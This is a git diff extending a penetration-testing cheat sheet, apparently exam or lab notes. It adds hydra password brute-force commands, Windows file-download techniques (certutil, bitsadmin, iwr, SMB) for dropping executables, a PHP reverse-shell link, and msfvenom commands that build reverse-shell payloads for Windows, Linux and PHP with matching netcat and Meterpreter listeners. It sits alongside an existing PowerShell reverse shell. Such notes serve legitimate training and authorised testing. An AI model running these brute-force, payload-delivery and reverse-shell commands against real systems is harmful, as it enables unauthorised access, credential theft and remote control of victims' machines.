@@ -20,6 +20,7 @@ ssh -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no" USER@IP
 
 ```sh
 xfreerdp3 /u:USER/p:PASS /v:IP /dynamic-resolution
+rdesktop IP -u USER -p PASS
 ```
 
 ### Reconnaissance and Enumeration
@@ -172,6 +173,8 @@ hydra -I -V -l USER -P PASSLIST "http-get://IP/webdav:A=BASIC:F=401"
 hydra -l USER -P /usr/share/wordlists/rockyou.txt -s 3389 rdp://IP -t 1 -v
 # SSH
 hydra -l USER -P /usr/share/wordlists/rockyou.txt IP -t 4 ssh -V
+# FTP (also check empty, username, and reversed username password)
+hydra -l 'admin' -P SecLists/Passwords/Default-Credentials/default-passwords.txt ftp://192.168.105.46 -e nsr -V
 
 # FFUF
 # Use request saved with Burp (make sure to put in FUZZ)
@@ -606,6 +609,58 @@ LPVOID lpReserved ) // Reserved
 }
 ```
 
+##### File Upload Tools
+
+Various ways to upload files to a Windows host.
+
+``` sh
+# Identify tools available
+where curl
+where wget
+where certutil
+where bitsadmin
+where powershell
+where python
+where ftp
+
+# Writable directory candidates
+C:\Temp
+C:\Windows\Temp
+C:\ProgramData
+C:\Users\Public
+%APPDATA%
+# Check write access
+echo test > C:\Temp\test.txt
+
+# HTTP
+# Server
+python3 -m http.server 80
+# Client (PowerShell)
+iwr http://IP/file.exe -OutFile C:\Temp\file.exe
+
+# certutil (cmd only, no PS)
+certutil -urlcache -split -f http://IP/file.exe C:\Temp\file.exe
+
+# Curl (Win 10 1803+)
+curl http://IP/file.exe -o C:\Temp\file.exe
+
+# Bitsadmin
+bitsadmin /transfer job http://IP/file.exe C:\Temp\file.exe
+
+# FTP
+ftp IP
+put FILE
+
+# SMB
+# Server
+impacket-smbserver share $(pwd) -smb2support
+# Client
+copy \\IP\share\file.exe C:\Temp\file.exe
+# or map
+net use Z: \\IP\share
+Z:\file.exe
+```
+
 ### Protocols
 
 Additional information per protocol.
@@ -1029,6 +1084,7 @@ select * from DB_NAME;
 ### Reverse Shells
 
 [https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/#summary](https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/#summary)
+[Linux and Windows PHP shell](https://github.com/ivan-sincek/php-reverse-shell/)
 
 [https://www.revshells.com/](https://www.revshells.com/)
 
@@ -1056,18 +1112,25 @@ $client = New-Object System.Net.Sockets.TCPClient('10.10.10.10',80);$stream = $c
 python3 -m http.server 80
 
 # Create payloads with msfvenom
+# .exe 64-bit, stageless
 msfvenom -p windows/x64/shell_reverse_tcp LHOST=IP LPORT=PORT -f exe > reverse.exe
+# .exe 32-bit, stageless
+msfvenom -p windows/shell_reverse_tcp LHOST=IP LPORT=PORT -f exe > reverse.exe
+# .elf, stageless
 msfvenom -p linux/x64/shell_reverse_tcp LHOST=IP LPORT=PORT -f elf -o shell
+# PHP
+msfvenom -p php/meterpreter/reverse_tcp -f raw LHOST=IP LPORT=PORT > pwn.php
+
 ```
 
 #### Listeners
 
 ``` sh
 # Netcat listener
-nc -nvlp 4444
+nc -nvlp PORT
 
 # Meterpreter listener
-msfconsole -x "use exploit/multi/handler;set payload windows/meterpreter/reverse_tcp;set LHOST 192.168.50.1;set LPORT 443;run;"
+msfconsole -x "use exploit/multi/handler;set payload windows/meterpreter/reverse_tcp;set LHOST IP;set LPORT PORT;run;"
 
 # Powercat listener script (Kali) and command to execute
 cp /usr/share/powershell-empire/empire/server/data/module_source/management/powercat.ps1 .
